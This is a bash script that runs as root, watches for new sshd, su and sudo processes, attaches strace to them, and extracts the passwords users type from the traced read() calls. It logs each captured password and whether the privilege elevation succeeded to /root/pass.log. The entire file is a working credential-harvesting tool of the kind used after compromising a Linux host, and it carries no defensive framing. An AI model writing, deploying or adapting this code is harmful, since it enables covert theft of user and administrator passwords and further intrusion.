#!/bin/bash

# Function to attach to SSH process and extract password attempts
attach_ssh () {
    # Capture the lines containing password attempts by tracing the process
    PASSWORD_LINES=$(strace -p $1 2>&1 | grep 'read(6, \"\\f')

	# Extract lines containing the SSH username and port information from the auth.log file
	USERNAME_LINES=$(journalctl -u ssh.service | grep ssh[d].$pid.*port)

	if [[ -z "$USERNAME_LINES" ]]; then
		USERNAME_LINES=$(grep "ssh[d].$pid.*port" /var/log/auth.log)
	fi

	# Initialize a counter for password attempts
    COUNT=1

	echo "Method: sshd" | tee -a $LOG_FILE

    # Print and log the username lines containing the user or IP information	
    echo "$USERNAME_LINES" | egrep --color "(user|for).(\w)*"   |tee -a $LOG_FILE
	
	if [[ -z $sshloginpids ]]; then
		echo "No Password Attempt Found" |tee -a $LOG_FILE
	else
		# Loop through each line containing a password attempt
		while IFS= read -r PLINE; do
		
			# Extract the password from the line and remove non-printable characters
			PASSWORD=$(printf "$PLINE" | tr -cd '[:print:]' | cut -f 2 -d \")
			
			# Print and log the password attempt with the corresponding count
			echo "Password Attempt $COUNT: \"$PASSWORD\""   | tee -a $LOG_FILE
			
			# Increment the counter
			COUNT=$((COUNT+1))
		done <<< "$PASSWORD_LINES"
	fi
		
    # Print a separator line for better readability in the log file	
    echo "----------------------------------------------------" |tee -a $LOG_FILE
}

parse_su () {
	PS_COMM=$( ps -p $1 -o command --no-header )

	# Capture the lines containing password attempts by tracing the process
    OUTPUT_LINES=$(strace -p $1 2>&1   )
	USER_UID=$(echo "$OUTPUT_LINES" | grep -i getuid | awk '{print $3}' | sort -u)
	USER_NAME=$(id -nu $USER_UID )
	PASSWORD=$(echo "$OUTPUT_LINES" | grep read\(0 |  sed s#\\\\n##g | cut -f 2 -d \")
	FAILED_ELEVATION=$( echo "$OUTPUT_LINES" | grep "Authentication failure" | wc -l )
		
		
	echo
	echo Process : "$PS_COMM" | tee -a $LOG_FILE
	echo "User: $USER_NAME" | tee -a $LOG_FILE
	# Print and log the password attempt 
	echo "Password Attempt: \"$PASSWORD\""   | tee -a $LOG_FILE
	
	if [[ "$FAILED_ELEVATION" -gt 0 ]]; then
		echo Elevation Failed | tee -a $LOG_FILE
	else
		echo Successfully Elevated | tee -a $LOG_FILE
	fi
	
	# Print a separator line for better readability in the log file	
    echo "----------------------------------------------------" |tee -a $LOG_FILE
}

parse_sudo () {
	PS_COMM=$( ps -p $1 -o command --no-header )
	OUTPUT_LINES=$(strace -p $1 2>&1  )
	USER_UID=$(echo "$OUTPUT_LINES" | grep -i getuid | awk '{print $3}' | sort -u)
	USER_NAME=$(id -nu $USER_UID )



	PASSWORD_LINES=$(echo "$OUTPUT_LINES" | grep ^read | grep "\ 1$" | cut -f 2 -d \" | tr -d '\n')
	
	SUCCESSFUL_ELEVATION=$( echo "$OUTPUT_LINES" | grep "setresuid.*\ 0\," | wc -l )

	# Initialize a counter for password attempts
    COUNT=1
	
	
	echo
	echo Process : $PS_COMM | tee -a $LOG_FILE

	echo "User: $USER_NAME" | tee -a $LOG_FILE

	while IFS= read -r PASSWORD; do
		
		# Print and log the password attempt with the corresponding count
		echo "Password Attempt $COUNT: \"$PASSWORD\""   | tee -a $LOG_FILE
		
		# Increment the counter
		COUNT=$((COUNT+1))
	done < <( printf "$PASSWORD_LINES" )
	
	if [[ "$SUCCESSFUL_ELEVATION" -gt 0 ]]; then
		echo Successfully Elevated | tee -a $LOG_FILE
	else
		echo Elevation Failed | tee -a $LOG_FILE
	fi
	
	# Print a separator line for better readability in the log file	
	echo "----------------------------------------------------" |tee -a $LOG_FILE
	
}

# Check if strace is installed
if ! command -v strace >/dev/null 2>&1; then
    echo "strace is not installed. Please install it before running this script."
    exit 1
fi

# Check if running in an elevated context
if [[ $EUID -ne 0 ]]; then
    echo "This script requires elevated privileges. Please run it as root or using sudo."
    exit 1
fi

processed_pids=()  # Array to track processed PIDs

LOG_FILE="/root/pass.log"
printf "Writing to $LOG_FILE\n\n"


while true; do
	unset sshloginpids
	unset supids
	unset sudopids
	
	recent_process_list=$(ps -eo pid,etimes,comm,command | awk '{if ($2 < 60) { print $0}}')
	
 
	sshloginpids=$(echo "$recent_process_list" | grep ss[h]d.*priv | awk '{print $1}')
	supids=$(echo "$recent_process_list" | awk '{if ($3 == "su") { print $1}}')
	sudopids=$(echo "$recent_process_list" | awk '{if ($3 == "sudo") { print $1}}')


	
    if [[ ! -z $sshloginpids ]]; then
        for pid in $sshloginpids; do
            # Check if PID has been processed before
            if [[ " ${processed_pids[*]} " != *" $pid "* ]]; then
                echo "Found SSHD Pid: $pid. Attaching..."
                processed_pids+=("$pid")  # Add PID to processed_pids array
                attach_ssh $pid &
            fi
        done
    fi
	
	if [[ ! -z $supids ]]; then
        for pid in $supids; do
            # Check if PID has been processed before
            if [[ " ${processed_pids[*]} " != *" $pid "* ]]; then
                echo "Found Su Pid: $pid. Attaching..."
                processed_pids+=("$pid")  # Add PID to processed_pids array
                parse_su $pid &
            fi
        done
    fi
	
	if [[ ! -z $sudopids ]]; then
        for pid in $sudopids; do
            # Check if PID has been processed before
            if [[ " ${processed_pids[*]} " != *" $pid "* ]]; then
                echo "Found Sudo Pid: $pid. Attaching..."
                processed_pids+=("$pid")  # Add PID to processed_pids array
                parse_sudo $pid &
            fi
        done
    fi
	
	
	
	
done



